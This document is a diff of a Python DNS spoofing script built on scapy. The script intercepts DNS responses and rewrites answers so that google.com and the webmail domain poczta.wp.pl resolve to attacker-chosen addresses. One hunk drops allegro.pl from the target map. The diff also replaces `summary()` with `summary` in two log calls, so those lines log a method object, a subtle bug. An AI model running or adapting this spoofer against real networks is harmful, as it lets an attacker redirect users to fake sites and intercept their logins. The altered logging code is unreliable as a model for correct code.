@@ -26,7 +26,7 @@ class DnsSnoof:
         scapy_packet = IP(packet.get_payload())
         if scapy_packet.haslayer(DNSRR):
             try:
-                log.info(f'[original] {scapy_packet[DNSRR].summary()}')
+                log.info(f'[original] {scapy_packet[DNSRR].summary}')
                 query_name = scapy_packet[DNSQR].qname
                 if query_name in self.hostDict:
                     scapy_packet[DNS].an = DNSRR(
@@ -36,7 +36,7 @@ class DnsSnoof:
                     del scapy_packet[IP].chksum
                     del scapy_packet[UDP].len
                     del scapy_packet[UDP].chksum
-                    log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
+                    log.info(f'[modified] {scapy_packet[DNSRR].summary}')
                 else:
                     log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
             except IndexError as ie:
@@ -50,8 +50,7 @@ if __name__ == '__main__':
     try:
         hostDict = {
             b"google.com.": "10.10.10.10",
-            b"poczta.wp.pl.": "5.5.5.5",
-            b"allegro.pl.": "5.5.5.5",
+            b"poczta.wp.pl.": "5.5.5.5"
         }
         queueNum = 1
         log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
